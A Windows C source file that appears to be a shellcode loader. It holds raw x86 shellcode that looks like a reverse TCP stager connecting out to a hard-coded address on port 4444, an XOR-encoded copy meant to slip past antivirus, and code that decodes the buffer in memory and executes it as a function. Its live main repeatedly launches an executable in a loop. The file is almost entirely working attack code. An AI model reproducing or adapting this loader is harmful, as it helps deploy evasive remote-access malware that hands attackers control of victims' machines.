#include <stdio.h>
#include <stdlib.h>  
#include <string.h>  
#include <windows.h>  

#if 0
#include <stdio.h>
#include <stdlib.h>

#if 0   /* origin shellcode */
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\x7b\x38\x0c\xf2\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
"\x53\xff\xd5";
#else
unsigned char buf[] = 
"\x56\xbd\x28\x55\xaa\x55\xca\xdc\x4f\x64\x6a\x31\x21\x05\x9a\xde"
"\xf8\x59\x21\x07\xbe\xde\xd8\x7d\xa5\xe2\xe0\x73\x9b\xaa\x06\x69"
"\xcb\x29\xa8\x79\x8a\x94\x65\x58\xab\x92\x48\xa7\xf8\x02\x21\x07"
"\xba\xde\xe0\x69\x21\x19\xbb\x2d\x49\x1d\xab\x84\xfb\xde\xf3\x75"
"\xab\x86\x21\x1c\xb2\xb6\x90\x1c\x21\x61\x21\x54\x7c\x64\x55\xf9"
"\x6b\x9a\xa7\x54\x6d\x6d\x4a\x20\x5c\x56\xd7\xad\x91\x28\x8e\x20"
"\x4e\x0d\x21\x0d\x8e\x54\x79\x33\x21\x59\xe1\xde\xf2\x49\xab\x86"
"\x21\x51\x21\x54\x7a\xdc\xee\x71\x8e\x0e\xf1\x34\xf3\x0f\xfb\xaa"
"\x4a\x0a\xf5\x0f\x21\x47\x41\xd8\xf7\x3d\x99\x67\xaa\x55\xc2\x22"
"\xd9\x67\xf5\x01\xc2\x19\xdd\x73\xad\xaa\x7f\xed\x3a\x54\xaa\x55"
"\x83\x91\xfe\x05\xc2\x7c\x2a\x3e\xaa\xaa\x7f\x3f\xaf\x3d\xd1\x6d"
"\xa6\xa7\xc2\x57\xaa\x44\xf6\xdc\x4c\x05\xfa\x05\xfa\x15\xfa\x15"
"\xfa\x3d\x40\x5a\x75\xb5\x55\x80\x3d\x3f\xba\x03\xfd\x3d\x33\xf0"
"\xde\x34\x55\x80\x2f\x95\xde\x5f\x55\x1b\xa2\x20\x46\xbd\xcb\x55"
"\xaa\x55\xc0\x55\xc0\x51\xfc\x02\xc2\x57\x73\x9d\xf5\xaa\x7f\xd6"
"\x52\x55\xd4\x63\x21\x63\xc0\x15\xc2\x55\xba\x55\xaa\x03\xc0\x55"
"\xc2\x0d\x0e\x06\x4f\xaa\x7f\xc6\xf9\x3f\xaa\x03\xf9\x02\xc2\x57"
"\x73\x9d\xf5\xaa\x7f\xd6\x52\x55\xd7\x77\xf2\x3d\xaa\x15\xaa\x55"
"\xc0\x55\xfa\x3d\xa1\x7a\xa5\x65\x55\x80\xfd\x3d\xdf\x3b\xe7\x34"
"\x55\x80\xf4\x0b\x55\x59\x8e\xbc\xdb\xaa\x55\xaa\xab\x96\x83\x93"
"\xdf\x92\x69\xee\x5a\xe0\x08\x03\xc0\x55\xf9\xaa\x7f";
#endif

int main()
{
    int i;
	void (*func)(void);
    char *p;
	//func = (void (*)())buf;
	//func();
    //printf("size %d\n", sizeof(buf));
    
#if 0
    printf("\"");
    for(i = 0; i < (sizeof(buf) - 1); i++) { /* omit the last '\0' */
        if (i != 0 && i % 16 == 0) {
             printf("\"\n\"");
        }
        if (i % 2 == 0) {
            printf("\\x%02x", buf[i] ^ 0xaa);
        } else {
            printf("\\x%02x", buf[i] ^ 0x55);
        }
    }
    
    printf("\";");
#else

    p = (char *)malloc(sizeof(buf));
    for(i = 0; i < (sizeof(buf) - 1); i++) {
        if (i % 2 == 0) {
            p[i] = buf[i] ^ 0xaa;
        } else {
            p[i] = buf[i] ^ 0x55;
        }
        

    }
    p[i] = '\0';
	func = (void (*)())p;
    while (1) {
        func();    
    }
	
#endif
	return 0;
}

#endif

unsigned char buf[] = 
"\x56\xbd\x28\x55\xaa\x55\xca\xdc\x4f\x64\x6a\x31\x21\x05\x9a\xde"
"\xf8\x59\x21\x07\xbe\xde\xd8\x7d\xa5\xe2\xe0\x73\x9b\xaa\x06\x69"
"\xcb\x29\xa8\x79\x8a\x94\x65\x58\xab\x92\x48\xa7\xf8\x02\x21\x07"
"\xba\xde\xe0\x69\x21\x19\xbb\x2d\x49\x1d\xab\x84\xfb\xde\xf3\x75"
"\xab\x86\x21\x1c\xb2\xb6\x90\x1c\x21\x61\x21\x54\x7c\x64\x55\xf9"
"\x6b\x9a\xa7\x54\x6d\x6d\x4a\x20\x5c\x56\xd7\xad\x91\x28\x8e\x20"
"\x4e\x0d\x21\x0d\x8e\x54\x79\x33\x21\x59\xe1\xde\xf2\x49\xab\x86"
"\x21\x51\x21\x54\x7a\xdc\xee\x71\x8e\x0e\xf1\x34\xf3\x0f\xfb\xaa"
"\x4a\x0a\xf5\x0f\x21\x47\x41\xd8\xf7\x3d\x99\x67\xaa\x55\xc2\x22"
"\xd9\x67\xf5\x01\xc2\x19\xdd\x73\xad\xaa\x7f\xed\x3a\x54\xaa\x55"
"\x83\x91\xfe\x05\xc2\x7c\x2a\x3e\xaa\xaa\x7f\x3f\xaf\x3d\xd1\x6d"
"\xa6\xa7\xc2\x57\xaa\x44\xf6\xdc\x4c\x05\xfa\x05\xfa\x15\xfa\x15"
"\xfa\x3d\x40\x5a\x75\xb5\x55\x80\x3d\x3f\xba\x03\xfd\x3d\x33\xf0"
"\xde\x34\x55\x80\x2f\x95\xde\x5f\x55\x1b\xa2\x20\x46\xbd\xcb\x55"
"\xaa\x55\xc0\x55\xc0\x51\xfc\x02\xc2\x57\x73\x9d\xf5\xaa\x7f\xd6"
"\x52\x55\xd4\x63\x21\x63\xc0\x15\xc2\x55\xba\x55\xaa\x03\xc0\x55"
"\xc2\x0d\x0e\x06\x4f\xaa\x7f\xc6\xf9\x3f\xaa\x03\xf9\x02\xc2\x57"
"\x73\x9d\xf5\xaa\x7f\xd6\x52\x55\xd7\x77\xf2\x3d\xaa\x15\xaa\x55"
"\xc0\x55\xfa\x3d\xa1\x7a\xa5\x65\x55\x80\xfd\x3d\xdf\x3b\xe7\x34"
"\x55\x80\xf4\x0b\x55\x59\x8e\xbc\xdb\xaa\x55\xaa\xab\x96\x83\x93"
"\xdf\x92\x69\xee\x5a\xe0\x08\x03\xc0\x55\xf9\xaa\x7f";

DWORD  WINAPI ThreadProc2(LPVOID lpThreadParameter)  
{  
    int i;
	void (*func)(void);
    char *p;

    p = (char *)malloc(sizeof(buf));
    for(i = 0; i < (sizeof(buf) - 1); i++) {
        if (i % 2 == 0) {
            p[i] = buf[i] ^ 0xaa;
        } else {
            p[i] = buf[i] ^ 0x55;
        }
        

    }
    p[i] = '\0';
	func = (void (*)())p;
    while(1);
    //func();
    printf("-------thread exit-----\n");  
    return 0;  
}  
  
int main(int argc, char* argv[])  
{  
    int count = 0;
    DWORD lpThreadId = 0;  
    HANDLE  h = NULL;
    DWORD exitCode;
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPTSTR szCmdline = "D:\\sprotect.exe";
    while (1) {
        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );
        
        if( !CreateProcess( NULL,   // No module name (use command line)
           szCmdline,      // Command line
           NULL,           // Process handle not inheritable
           NULL,           // Thread handle not inheritable
           FALSE,          // Set handle inheritance to FALSE
           0,              // No creation flags
           NULL,           // Use parent's environment block
           NULL,           // Use parent's starting directory
           &si,            // Pointer to STARTUPINFO structure
           &pi )           // Pointer to PROCESS_INFORMATION structure
           )
        {
           printf( "CreateProcess failed (%d)./n", GetLastError() );
           return -1;
        }
        WaitForSingleObject( pi.hProcess, INFINITE );
        printf("%d \n", count++);
    }
    
#if 0     
    while (1) {
        printf("%s-%d\n",  __func__, __LINE__);
        if (h == NULL) {
            h = CreateThread(NULL, 0, ThreadProc2, NULL, 0, &lpThreadId);  
            printf("create thread id %d h %x\n", lpThreadId, h);
            
        }
        printf("%s-%d\n",  __func__, __LINE__);
        GetExitCodeThread(h, &exitCode);
        printf("%s-%d\n",  __func__, __LINE__);
         if (exitCode == STILL_ACTIVE) {
            printf("Thread %d is still running!\n", lpThreadId);
         } else {
            printf("Thread %d exit!\n", lpThreadId);
            h = NULL;
         }
         printf("%s-%d\n",  __func__, __LINE__);
         Sleep(1000);
         printf("%s-%d\n",  __func__, __LINE__);
    }
#endif

    printf("main exit.\n");
    return 0;  
}  
